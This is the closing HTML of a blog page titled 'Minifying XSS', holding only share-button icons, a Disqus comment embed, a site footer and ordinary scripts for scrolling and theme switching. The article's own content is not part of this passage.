href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fwww.jakobthe.dev%2fposts%2fminifying-xss%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Minifying XSS on whatsapp" href="https://api.whatsapp.com/send?text=Minifying%20XSS%20-%20https%3a%2f%2fwww.jakobthe.dev%2fposts%2fminifying-xss%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Minifying XSS on telegram" href="https://telegram.me/share/url?text=Minifying%20XSS&url=https%3a%2f%2fwww.jakobthe.dev%2fposts%2fminifying-xss%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//JakobTheDev.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></article></main><footer class=footer><span>&copy; 2022 <a href=https://www.jakobthe.dev/>JakobTheDev | Jakob Pennington</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>